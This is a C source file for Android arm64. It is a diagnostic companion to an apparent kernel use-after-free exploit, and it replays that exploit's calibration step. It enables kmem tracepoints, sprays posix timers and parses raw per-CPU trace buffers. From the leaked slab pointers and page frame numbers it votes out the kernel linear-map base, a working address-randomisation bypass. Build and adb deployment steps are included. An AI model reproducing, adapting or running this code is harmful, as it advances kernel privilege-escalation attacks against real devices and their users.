/*
 * calib_diag.c -- diagnostics for "[base] calibration failed".
 *
 * calibrate_base() in native/timer.c votes the linear-map base by pairing
 * kmem_cache_alloc records of our own posix timers with page_alloc records
 * of our own pid.  When the vote comes back empty it prints only
 * "best=0 count=0", which does not say *which* input was missing.  This tool
 * replays the exact same scan and prints the raw observations:
 *
 *   - kmem_cache_alloc records for our pid: the observed call sites and
 *     bytes_req/bytes_alloc, compared against the conf's timer_site /
 *     timer_alloc
 *   - page alloc/free records for our pid: event type x order histogram
 *   - the base vote itself, both with the strict order-1 voter set and with
 *     every page alloc as a voter (a kernel whose posix_timers_cache slabs
 *     are order 0 only produces order-0 voters)
 *   - per-cpu record counts, to confirm the CPU pin the exploit relies on
 *
 * It only creates posix timers and reads tracefs; it never triggers the UAF,
 * so it is safe to run repeatedly and needs no reboot afterwards.
 *
 * Build (NDK r27):
 *   NDK=~/Library/Android/sdk/ndk/27.2.12479018
 *   $NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/clang \
 *       --target=aarch64-linux-android30 -O2 -static -o calib_diag calib_diag.c
 *
 * Run:
 *   adb push calib_diag /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/calib_diag
 *   adb shell /data/local/tmp/calib_diag --conf <conf> [cpu N]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>

#define TR "/sys/kernel/tracing"
#define PAGE 4096UL
#define NTIMERS 512
#define MAXDISTINCT 24
#define HBITS 12
#define HSIZE (1 << HBITS)

static unsigned long long g_timer_site, g_timer_alloc;
static unsigned g_t_page_alloc, g_t_page_free;
static int g_cpu = 2;

/* ------------------------------------------------------------------ utils */

static void logf(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);

    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}

static void pin(int cpu)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;

    memcpy(&v, b + o, 4);
    return v;
}

static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;

    memcpy(&v, b + o, 8);
    return v;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };

    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        logf("[diag] trigger %-42s -> %d\n", evs[i],
             wr(TR "/events/kmem/rss_stat/trigger", evs[i]));
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];

    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}

static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}

static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;

    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

/* ------------------------------------------------------------------- conf */

static void parse_conf_line(char *line)
{
    char *p, *key, *val, *hash, *slash;
    unsigned long long num;

    hash = strchr(line, '#');
    if (hash)
        *hash = '\0';
    slash = strstr(line, "//");
    if (slash)
        *slash = '\0';

    key = line;
    while (*key == ' ' || *key == '\t')
        key++;
    val = strchr(key, '=');
    if (!val)
        return;
    *val = '\0';
    val++;
    for (p = key + strlen(key) - 1; p >= key && (*p == ' ' || *p == '\t'); p--)
        *p = '\0';
    while (*val == ' ' || *val == '\t')
        val++;
    if (!*val || *val == '"')
        return;
    num = strtoull(val, NULL, 0);
    if (!strcmp(key, "timer_site"))
        g_timer_site = num;
    else if (!strcmp(key, "timer_alloc"))
        g_timer_alloc = num;
}

static void load_conf(const char *path)
{
    FILE *f = fopen(path, "r");
    char line[256];

    if (!f)
    {
        logf("[-] cannot open conf: %s\n", path);
        exit(1);
    }
    while (fgets(line, sizeof(line), f))
        parse_conf_line(line);
    fclose(f);
    logf("[diag] conf timer_site=%#llx (low21=%#llx) timer_alloc=%#llx\n",
         g_timer_site, g_timer_site & 0x1fffffULL, g_timer_alloc);
}

/* --------------------------------------------------- page event id pairing */

/*
 * Same pairing as discover_page_types(): allocate and free anonymous pages
 * and take the event type that appears as the alloc side of a pfn pair.
 */
static int discover_page_types(unsigned char *raw)
{
    struct
    {
        unsigned long long pfn;
        unsigned a, f;
    } pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
        return -1;
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned type;

        if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) > 10 ||
            u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].a)
                    pairs[k].a = type;
                else if (!pairs[k].f)
                    pairs[k].f = type;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].a = type;
            np++;
        }
    next:;
    }
    for (int k = 0; k < np; k++)
    {
        if (pairs[k].a && pairs[k].f && pairs[k].a != pairs[k].f)
        {
            g_t_page_alloc = pairs[k].a;
            g_t_page_free = pairs[k].f;
            logf("[diag] page_alloc=%u page_free=%u\n", g_t_page_alloc,
                 g_t_page_free);
            return 0;
        }
    }
    logf("[-] page event ids not found (records=%zu pairs=%d)\n", (size_t)n, np);
    return -1;
}

/* --------------------------------------------------------------- analysis */

struct site_ent
{
    unsigned long long site, req, alloc;
    int cnt;
};

struct vote_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long vote(const unsigned long long *ptrs, int nptr,
                               const unsigned long long *pfns, int npfn,
                               unsigned long long *out_cnt)
{
    static struct vote_slot tab[HSIZE];
    unsigned long long best = 0, bestc = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nptr; i++)
    {
        unsigned long long slab = ptrs[i] & ~0x1fffULL;

        for (int j = 0; j < npfn; j++)
        {
            unsigned long long base = slab - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) & (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > bestc)
        {
            bestc = tab[i].cnt;
            best = tab[i].key;
        }
    *out_cnt = bestc;
    return best;
}

int main(int argc, char **argv)
{
    const char *conf_path = NULL;
    unsigned char *raw;
    int me = getpid(), argi = 1;

    setvbuf(stdout, NULL, _IONBF, 0);

    while (argi < argc && !strcmp(argv[argi], "--conf"))
    {
        if (argi + 1 >= argc)
        {
            fprintf(stderr, "usage: %s --conf <conf> [cpu N]\n", argv[0]);
            return 1;
        }
        conf_path = argv[argi + 1];
        argi += 2;
    }
    if (argi < argc && !strcmp(argv[argi], "cpu") && argi + 1 < argc)
        g_cpu = atoi(argv[argi + 1]);
    if (!conf_path)
    {
        fprintf(stderr, "usage: %s --conf <conf> [cpu N]\n", argv[0]);
        return 1;
    }
    load_conf(conf_path);

    raw = malloc(64u << 20);
    if (!raw)
        return 1;

    enable_events();
    pin(g_cpu);
    logf("[diag] pid=%d pinned cpu=%d (running on %d)\n", me, g_cpu,
         sched_getcpu());

    if (discover_page_types(raw))
        return 1;

    /* ---- the calibration burst, exactly as calibrate_base() does it ---- */
    trace_start();
    int made = 0;
    for (int i = 0; i < NTIMERS; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    logf("[diag] timers created=%d\n", made);

    long n = read_cpu(g_cpu, raw, 48u << 20);
    logf("[diag] cpu%d records: %ld bytes\n", g_cpu, n);
    if (n <= 0)
    {
        logf("[-] no records on cpu%d\n", g_cpu);
        return 1;
    }

    /* ---- kmem_cache_alloc records for our pid ---- */
    struct site_ent sites[MAXDISTINCT];
    int ns = 0, kmem_total = 0, site_ok = 0;
    unsigned long long ptrs[NTIMERS];
    int nptr = 0;

    for (size_t i = 8; i + 32 <= (size_t)n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        site = u64(raw, i);
        ptr = u64(raw, i + 8);
        req = u64(raw, i + 16);
        alloc = u64(raw, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        kmem_total++;
        int f = 0;
        for (int k = 0; k < ns; k++)
            if (sites[k].site == site && sites[k].req == req &&
                sites[k].alloc == alloc)
            {
                sites[k].cnt++;
                f = 1;
                break;
            }
        if (!f && ns < MAXDISTINCT)
        {
            sites[ns].site = site;
            sites[ns].req = req;
            sites[ns].alloc = alloc;
            sites[ns].cnt = 1;
            ns++;
        }
        if ((site & 0x1fffffULL) == (g_timer_site & 0x1fffffULL) &&
            req == g_timer_alloc && alloc == g_timer_alloc &&
            nptr < NTIMERS)
        {
            ptrs[nptr++] = ptr;
            site_ok++;
        }
    }
    logf("[kmem] records for our pid: %d (distinct site/req/alloc: %d)\n",
         kmem_total, ns);
    for (int k = 0; k < ns; k++)
        logf("[kmem]   site=%#llx low21=%#llx req=%#llx alloc=%#llx cnt=%d\n",
             sites[k].site, sites[k].site & 0x1fffffULL, sites[k].req,
             sites[k].alloc, sites[k].cnt);
    logf("[kmem] matching conf (site low21 + req + alloc): %d\n", site_ok);

    /* ---- page alloc/free records for our pid ---- */
    static int ph[1024][11];
    int page_total = 0;

    memset(ph, 0, sizeof(ph));
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1023)
            continue;
        ph[type][order]++;
        page_total++;
    }
    logf("[page] records for our pid: %d\n", page_total);
    for (unsigned t = 1; t < 1024; t++)
        for (unsigned o = 0; o <= 10; o++)
            if (ph[t][o])
                logf("[page]   type=%u order=%u cnt=%d%s\n", t, o, ph[t][o],
                     t == g_t_page_alloc ? "  <- page_alloc" :
                     t == g_t_page_free ? "  <- page_free" : "");

    /* ---- voter sets ---- */
    unsigned long long strict[64], allp[256];
    int rn_strict = 0, rn_all = 0;

    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26) || u32(raw, i - 4) != (unsigned)me)
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (type != g_t_page_alloc)
            continue;
        if (order == 1)
        {
            if (rn_strict == 64)
                memmove(strict, strict + 1, 63 * sizeof(strict[0])), rn_strict--;
            strict[rn_strict++] = pfn;
        }
        if (rn_all == 256)
            memmove(allp, allp + 1, 255 * sizeof(allp[0])), rn_all--;
        allp[rn_all++] = pfn;
    }
    logf("[page] page_alloc(type=%u) voters: order-1=%d any-order=%d\n",
         g_t_page_alloc, rn_strict, rn_all);

    /* ---- the vote itself ---- */
    unsigned long long c1 = 0, c2 = 0;
    unsigned long long b1 = vote(ptrs, nptr, strict, rn_strict, &c1);
    unsigned long long b2 = vote(ptrs, nptr, allp, rn_all, &c2);

    logf("[vote] strict  (order==1): best=%#llx count=%llu\n", b1, c1);
    logf("[vote] relaxed (any order): best=%#llx count=%llu\n", b2, c2);

    /* ---- distinct slab pages of the matched timers ---- */
    unsigned long long slabs[256];
    int nsl = 0;
    for (int i = 0; i < nptr && nsl < 256; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;
        for (int j = 0; j < nsl; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[nsl++] = s;
    }
    logf("[kmem] matched timer objects=%d distinct 8K slab pages=%d\n", nptr,
         nsl);

    /* ---- where did our records land? ---- */
    for (int c = 0; c < 8; c++)
    {
        long m = read_cpu(c, raw, 16u << 20);
        int cnt = 0;
        for (size_t i = 8; m > 0 && i + 32 <= (size_t)m; i += 4)
            if (u32(raw, i - 4) == (unsigned)me && is_kernel_ptr(u64(raw, i + 8)))
                cnt++;
        logf("[cpu ] cpu%d: %ld bytes, %d kmem records for our pid\n", c, m,
             cnt);
    }

    /* ---- verdict ---- */
    if (kmem_total == 0)
        logf("[FAIL] no kmem_cache_alloc records for our pid: event enabling "
             "or cpu pin problem\n");
    else if (site_ok == 0)
        logf("[FAIL] site/size mismatch: no kmem record matched "
             "timer_site=%#llx timer_alloc=%#llx\n", g_timer_site,
             g_timer_alloc);
    else if (rn_strict == 0)
        logf("[FAIL] no order-1 page_alloc records for our pid in the window "
             "(slabs are not order 1 on this kernel)\n");
    else if (c1 < 4)
        logf("[FAIL] vote count %llu below threshold 4\n", c1);
    else
        logf("[ OK ] calibration should have succeeded\n");
    return 0;
}
